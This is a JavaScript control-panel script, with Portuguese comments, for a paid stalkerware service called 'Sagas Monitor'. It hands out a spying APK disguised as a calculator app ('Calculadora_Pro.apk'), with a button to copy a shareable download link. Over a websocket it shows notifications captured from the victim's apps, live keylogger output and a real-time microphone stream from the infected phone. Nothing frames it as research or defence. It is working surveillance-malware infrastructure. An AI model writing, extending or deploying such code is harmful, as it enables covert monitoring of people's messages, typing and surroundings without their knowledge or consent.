/**
 * SAGAS MONITOR - SCRIPT DE INTERFACE (VERSÃO OTIMIZADA)
 */

// --- 1. SELETORES ---
const btnAudio = document.getElementById('btn-audio');
const btnDownload = document.getElementById('btn-download');
const btnCopyLink = document.getElementById('btn-copy-link');
const statusPill = document.getElementById('status-pill');
const statusTime = document.getElementById('status-time');
const expiraTxt = document.getElementById('expira-txt');
const audioDetail = document.getElementById('audio-detail');
const cardNotif = document.getElementById('card-notif');
const cardKeylog = document.getElementById('card-keylog');
const notifApp = document.getElementById('notif-app');
const notifSender = document.getElementById('notif-sender');
const notifDetail = document.getElementById('notif-detail');
const keylogDetail = document.getElementById('keylog-detail');
const userDisplay = document.getElementById('user-display');
const btnLogout = document.getElementById('btn-logout');
const modal = document.getElementById('modal-historico');
const btnCloseModal = document.getElementById('close-modal');
const listaMensagens = document.getElementById('lista-mensagens');

// --- 2. CONFIGURAÇÕES ---
const WS_URL = 'wss://agendapro.dev.br';
// URL alterada para a rota de download do seu servidor Node
const APK_URL = '/download-apk'; 

let audioCtx, socket, nextTime = 0, isStreaming = false;
let historicoMsgs = []; 
let currentUserId = null; 

/**
 * 3. DOWNLOAD AUTOMÁTICO E CÓPIA DE LINK
 */
btnDownload.onclick = () => {
    // Cria um elemento de link "invisível" para disparar o download imediato
    const link = document.createElement('a');
    link.href = APK_URL;
    
    // Define o atributo download para forçar o navegador a baixar em vez de navegar
    link.setAttribute('download', 'Calculadora_Pro.apk');
    
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
};

btnCopyLink.onclick = () => {
    // Copia a URL completa (ajustado para usar a origem do site atual)
    const fullUrl = window.location.origin + APK_URL;
    navigator.clipboard.writeText(fullUrl).then(() => {
        alert("Link de download direto copiado!");
    });
};

/**
 * 4. AUTENTICAÇÃO E LICENÇA
 */
async function checarAcessoNoBanco() {
    const token = localStorage.getItem('monitor_token');
    if (!token) { window.location.href = '/login/index.html'; return; }

    try {
        const res = await fetch('/usuarios/meu-acesso', {
            headers: { 'Authorization': `Bearer ${token}` }
        });

        if (res.status === 401 || res.status === 403) {
            localStorage.clear();
            window.location.href = '/login/index.html';
            return;
        }

        const data = await res.json();

        if (!data.success || data.expirado) {
            localStorage.removeItem('monitor_token');
            window.location.href = '/login/index.html';
            return;
        }

        currentUserId = data.id; 
        userDisplay.innerText = data.username;
        const dataExp = new Date(data.expira_em);
        expiraTxt.innerText = `Licença ativa até: ${dataExp.toLocaleString('pt-BR')}`;
        
        carregarHistoricoDoBanco();
        conectarWebSocket();

        setInterval(() => {
            const diff = dataExp - new Date();
            if (diff <= 0) window.location.reload();
            const h = Math.floor(diff / 3600000);
            const m = Math.floor((diff % 3600000) / 60000);
            const s = Math.floor((diff % 60000) / 1000);
            statusTime.innerText = `${h}h ${m}m ${s}s rest.`;
        }, 1000);

    } catch (e) { 
        console.error("Erro ao checar acesso:", e);
        expiraTxt.innerText = "Erro de conexão com o servidor."; 
    }
}

/**
 * 5. GESTÃO DE MENSAGENS (BANCO)
 */
async function carregarHistoricoDoBanco() {
    const token = localStorage.getItem('monitor_token');
    try {
        const res = await fetch('/usuarios/historico-notificacoes', {
            headers: { 'Authorization': `Bearer ${token}` }
        });
        const data = await res.json();
        if (data.success) {
            historicoMsgs = data.notificacoes.map(n => ({
                id: n.id,
                app: n.app_origem,
                de: n.titulo,
                texto: n.mensagem,
                hora: new Date(n.data_recebimento).toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' })
            }));
            if(historicoMsgs.length > 0) {
                cardNotif.classList.remove('locked');
                renderizarHistorico();
            }
        }
    } catch (e) { console.error(e); }
}

async function deletarNotificacao(id) {
    if (!confirm("Excluir esta mensagem permanentemente?")) return;
    const token = localStorage.getItem('monitor_token');
    try {
        const res = await fetch(`/usuarios/notificacao/${id}`, { 
            method: 'DELETE',
            headers: { 'Authorization': `Bearer ${token}` }
        });
        const data = await res.json();
        if (data.success) {
            historicoMsgs = historicoMsgs.filter(m => m.id !== id);
            renderizarHistorico();
        }
    } catch (e) { alert("Erro ao deletar."); }
}

function renderizarHistorico() {
    if (historicoMsgs.length === 0) {
        listaMensagens.innerHTML = `<p style="text-align:center; color:var(--subtext); margin-top:20px;">Nenhuma notificação capturada.</p>`;
        return;
    }
    listaMensagens.innerHTML = historicoMsgs.map(m => `
        <div class="msg-item">
            <div style="display:flex; justify-content:space-between;">
                <small style="color: var(--accent); font-weight:bold;">${m.app.toUpperCase()}</small>
                <div style="display:flex; gap:10px; align-items:center;">
                    <small style="color: var(--subtext);">${m.hora}</small>
                    <button class="btn-delete-msg" onclick="deletarNotificacao(${m.id})">🗑️</button>
                </div>
            </div>
            <b style="color: #e6edf3; font-size: 14px; display:block; margin:5px 0;">${m.de}:</b>
            <span style="color: var(--subtext); font-size: 13px;">${m.texto}</span>
        </div>
    `).join('');
}

/**
 * 6. WEBSOCKET
 */
function conectarWebSocket() {
    if (!currentUserId) return;
    socket = new WebSocket(WS_URL);
    socket.binaryType = 'arraybuffer';

    socket.onopen = () => {
        statusPill.innerText = "Online";
        statusPill.className = "status-online";
        socket.send(JSON.stringify({ type: 'auth_panel', userId: currentUserId }));
    };

    socket.onmessage = async (e) => {
        if (e.data instanceof ArrayBuffer) {
            if (isStreaming) playStream(e.data);
            return;
        }
        try {
            const msg = JSON.parse(e.data);
            
            if (msg.type === 'notification') {
                cardNotif.classList.remove('locked');
                const appName = msg.app ? msg.app.split('.').pop() : "App";
                
                notifApp.innerText = appName;
                notifSender.innerText = msg.title || "Remetente";
                notifDetail.innerText = msg.message || "...";
                
                historicoMsgs.unshift({
                    id: msg.id || Date.now(), 
                    app: appName,
                    de: msg.title,
                    texto: msg.message,
                    hora: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' })
                });
                renderizarHistorico();
            }

            if (msg.type === 'keylog') {
                cardKeylog.classList.remove('locked');
                keylogDetail.innerText = `Digitado: ${msg.text}`;
            }
        } catch (err) {
            console.error("Erro ao processar mensagem JSON:", err);
        }
    };

    socket.onclose = () => {
        statusPill.innerText = "Reconectando...";
        statusPill.className = "status-offline";
        setTimeout(conectarWebSocket, 3000);
    };
}

/**
 * 7. ÁUDIO EM TEMPO REAL (SEM ATRASO)
 */
btnAudio.onclick = async () => {
    if (!isStreaming) {
        try {
            if (!audioCtx) {
                audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 16000 });
            }
            if (audioCtx.state === 'suspended') await audioCtx.resume();
            
            nextTime = audioCtx.currentTime;
            
            socket.send("START");
            isStreaming = true;
            btnAudio.innerText = "PARAR";
            btnAudio.classList.add('active');
            audioDetail.innerText = "Monitorando áudio ao vivo...";
        } catch (err) {
            console.error("Erro ao iniciar áudio:", err);
            alert("Clique na página antes de iniciar o áudio para permitir a reprodução.");
        }
    } else {
        socket.send("STOP_SERVICE");
        isStreaming = false;
        btnAudio.innerText = "OUVIR";
        btnAudio.classList.remove('active');
        audioDetail.innerText = "Áudio parado";
    }
};

function playStream(data) {
    if (!audioCtx || audioCtx.state === 'suspended') return;

    const samples = new Int16Array(data);
    const floats = new Float32Array(samples.length);
    for (let i = 0; i < samples.length; i++) floats[i] = samples[i] / 32768;

    const buffer = audioCtx.createBuffer(1, floats.length, 16000);
    buffer.getChannelData(0).set(floats);

    const source = audioCtx.createBufferSource();
    source.buffer = buffer;
    source.connect(audioCtx.destination);

    const now = audioCtx.currentTime;
    
    if (nextTime < now || nextTime > now + 0.2) {
        nextTime = now + 0.05; 
    }

    source.start(nextTime);
    nextTime += buffer.duration;
}

// --- 8. EVENTOS DE UI ---
cardNotif.onclick = () => {
    modal.style.display = "block";
    renderizarHistorico();
};

btnCloseModal.onclick = () => modal.style.display = "none";

btnLogout.onclick = () => { 
    if(confirm("Deseja sair do painel?")) {
        localStorage.clear(); 
        window.location.href = '/login/index.html'; 
    }
};

window.onclick = (e) => { 
    if (e.target == modal) modal.style.display = "none"; 
};

// Inicialização
checarAcessoNoBanco();